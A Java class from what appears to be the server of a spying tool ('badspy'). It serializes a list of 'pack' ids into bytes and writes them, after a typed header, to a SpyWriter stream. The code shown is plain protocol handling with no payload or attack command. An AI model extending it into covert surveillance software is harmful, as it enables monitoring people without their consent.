package com.blogspot.sontx.badspy.badserver.bo.bdrworker;

import com.blogspot.sontx.badspy.badserver.bean.Pack;
import com.blogspot.sontx.badspy.badserver.bean.SpyDataHeader;
import com.blogspot.sontx.badspy.badserver.bo.Receiver;
import com.blogspot.sontx.badspy.badserver.bo.SpyReader;
import com.blogspot.sontx.badspy.badserver.bo.SpyWriter;

import java.io.IOException;
import java.util.List;

/**
 * Copyright 2016 by sontx
 * Created by sontx on 30/4/2016.
 */
public class BdrPackList extends Receiver {
    public BdrPackList(SpyReader reader, SpyWriter writer, int dataLength) {
        super(reader, writer, dataLength);
    }

    /**
     * Note: we just using id to pack to bytes array, each id just has one byte
     */
    private byte[] getPacksAsBytes(List<Pack> packs) {
        byte[] bytes = new byte[packs.size()];
        for (int i = 0; i < bytes.length; i++) {
            bytes[i] = (byte) packs.get(i).getId();
        }
        return bytes;
    }

    @Override
    public void start() throws IOException {
        List<Pack> packs = BdrPackManager.getAllPacks();
        byte[] bytes = getPacksAsBytes(packs);

        SpyDataHeader header = new SpyDataHeader();
        header.setContentType(SpyDataHeader.HEADER_BDR_PACKS_LIST);
        header.setContentLength(bytes.length);
        writer.write(header);

        writer.write(bytes, 0, bytes.length);
    }
}
